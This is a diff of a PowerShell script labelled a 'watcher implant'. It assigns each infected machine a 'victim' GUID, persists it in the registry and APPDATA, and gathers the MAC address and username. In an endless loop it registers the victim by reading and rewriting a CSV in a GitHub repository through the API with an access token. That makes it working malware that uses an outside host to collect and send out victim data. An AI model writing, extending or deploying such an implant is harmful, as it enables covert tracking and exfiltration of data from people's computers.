@@ -1,5 +1,5 @@
 # ===============================================
-# UNIVERSAL WATCHER IMPLANT (REGISTER ONLY)
+# UNIVERSAL WATCHER IMPLANT (REGISTER ONLY, CONFIRM EXISTING GUID)
 # ===============================================
 
 # === CONFIGURATION SETTINGS ===
@@ -12,9 +12,7 @@ $GuidFile             = "$env:APPDATA\PRE_ATTACK_GUID.txt"
 $RegistryKey          = "HKCU:\Software\Microsoft\Windows\CurrentVersion"
 $RegistryValue        = "PRE_ATTACK_GUID_REG_KEY"
 
-$PayloadFolder        = "$env:APPDATA\Payloads"
 $LogFile              = "$env:APPDATA\watcher_log.txt"
-
 $LoopIntervalSeconds  = 10
 $UserAgent            = "Watcher-Script"
 
@@ -25,34 +23,43 @@ function Log-Message {
     Write-Host $Text
 }
 
-# === PREPARE FOLDERS ===
-if (-not (Test-Path $PayloadFolder)) {
-    New-Item -ItemType Directory -Path $PayloadFolder | Out-Null
-}
-Log-Message "[$(Get-Date)] === Watcher started ==="
-[System.Windows.MessageBox]::Show("Watcher started. --1")
+# === ADD MessageBox ===
+Add-Type -AssemblyName PresentationFramework
 
-# === LOAD OR GENERATE VICTIM GUID ===
+Log-Message "[$(Get-Date)] === Watcher started ==="
+[System.Windows.MessageBox]::Show("Watcher started.")
+
+# === STEP 1: Load or Generate GUID ===
 $Victim_GUID = ""
 
+# Try registry
 try {
     $reg = Get-ItemProperty -Path $RegistryKey -Name $RegistryValue -ErrorAction SilentlyContinue
-    if ($reg) { $Victim_GUID = $reg.$RegistryValue }
-} catch {}
+    if ($reg) {
+        $Victim_GUID = $reg.$RegistryValue
+        Log-Message "[$(Get-Date)] Loaded GUID from registry."
+        [System.Windows.MessageBox]::Show("Existing GUID loaded from registry:`n$Victim_GUID")
+    }
+}
+catch {}
 
+# If still empty, try text file
 if (-not $Victim_GUID -or $Victim_GUID -eq "") {
     if (Test-Path $GuidFile) {
         $Victim_GUID = Get-Content -Path $GuidFile -Raw
+        Log-Message "[$(Get-Date)] Loaded GUID from text file."
+        [System.Windows.MessageBox]::Show("Existing GUID loaded from file:`n$Victim_GUID")
     }
 }
 
+# If still empty, generate new
 if (-not $Victim_GUID -or $Victim_GUID -eq "") {
     $Victim_GUID = [guid]::NewGuid().ToString()
     Set-ItemProperty -Path $RegistryKey -Name $RegistryValue -Value $Victim_GUID -Force
     $Victim_GUID | Out-File -Encoding UTF8 -FilePath $GuidFile
+    Log-Message "[$(Get-Date)] New GUID generated and saved."
+    [System.Windows.MessageBox]::Show("New GUID generated:`n$Victim_GUID")
 }
-Log-Message "[$(Get-Date)] GUID: $Victim_GUID"
-[System.Windows.MessageBox]::Show("GUID --2: $Victim_GUID")
 
 # === INITIALIZE WEB CLIENT ===
 $wc = New-Object System.Net.WebClient
@@ -60,14 +67,9 @@ $wc.Headers.Add("Authorization", "token $GitHubToken")
 $wc.Headers.Add("User-Agent", $UserAgent)
 $wc.Headers.Add("Accept", "application/vnd.github.v3+json")
 
-# === ADD MessageBox ===
-Add-Type -AssemblyName PresentationFramework
-
 # === LOOP FOREVER ===
 while ($true) {
     try {
-        [System.Windows.MessageBox]::Show("Checking registration status... ---3")
-
         # Fetch CSV metadata
         $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
         $metaJson = $wc.DownloadString($MetaURL)
@@ -76,7 +78,7 @@ while ($true) {
         $sha = $metaObj.sha
 
         if (-not $downloadUrl) {
-            throw "Failed to obtain download URL."
+            throw "Failed to get download URL."
         }
 
         $csvText = $wc.DownloadString($downloadUrl)
@@ -94,9 +96,12 @@ while ($true) {
             }
         }
 
-        if (-not $alreadyExists) {
-            [System.Windows.MessageBox]::Show("Victim not found. Registering... --4")
-            # === COLLECT SYSTEM INFO ===
+        if ($alreadyExists) {
+            Log-Message "[$(Get-Date)] GUID already registered in CSV."
+            [System.Windows.MessageBox]::Show("GUID is already registered:`n$Victim_GUID")
+        }
+        else {
+            # Collect system info
             $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
             $mac  = if ($macs.Count -gt 0) { $macs[0].MACAddress } else { "UNKNOWN" }
 
@@ -114,7 +119,7 @@ while ($true) {
             $user = $env:USERNAME
             $pass = "NOT_CAPTURED"
 
-            # === CREATE NEW CSV ROW ===
+            # Create new row
             $lastId = 0
             foreach ($line in $lines) {
                 if ($line -match "^\d+,") {
@@ -138,7 +143,7 @@ while ($true) {
                 sha     = $sha
             } | ConvertTo-Json -Compress
 
-            # === Upload updated CSV ===
+            # Upload updated CSV
             $upload = [System.Net.WebRequest]::Create($MetaURL)
             $upload.Method = "PUT"
             $upload.Headers.Add("Authorization", "token $GitHubToken")
@@ -151,16 +156,12 @@ while ($true) {
             $upload.GetResponse().Close()
 
             Log-Message "[$(Get-Date)] ✅ New victim registered."
-            [System.Windows.MessageBox]::Show("User successfully registered. ---5")
-        }
-        else {
-            Log-Message "[$(Get-Date)] Victim already registered."
-            [System.Windows.MessageBox]::Show("User already registered. ---6")
+            [System.Windows.MessageBox]::Show("New victim registered successfully:`n$Victim_GUID")
         }
     }
     catch {
         Log-Message "[$(Get-Date)] ❌ Error: $_"
-        [System.Windows.MessageBox]::Show("Error: --7" + $_)
+        [System.Windows.MessageBox]::Show("Error:`n$_")
     }
 
     Start-Sleep -Seconds $LoopIntervalSeconds
